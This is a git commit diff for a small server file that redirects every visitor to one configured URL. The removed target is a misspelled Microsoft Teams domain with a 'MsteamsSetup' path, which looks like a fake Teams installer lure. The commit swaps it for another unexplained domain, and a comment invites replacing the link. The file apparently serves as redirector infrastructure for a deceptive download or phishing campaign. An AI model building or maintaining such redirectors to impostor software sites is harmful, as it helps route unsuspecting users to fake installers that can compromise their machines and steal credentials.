224f9630f89e06a77def63f0b7f8c0c3c7592eff
Digital2025001 <bosmichael30@gmail.com>
2026-01-26 18:00:43 -0800

    Update redirect location in main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://teemssmeetting.ws/MsteamsSetup/teams/", // Replace this with your actual link
+      Location: "https://lop12e.net/", // Replace this with your actual link
     },
   });
 });
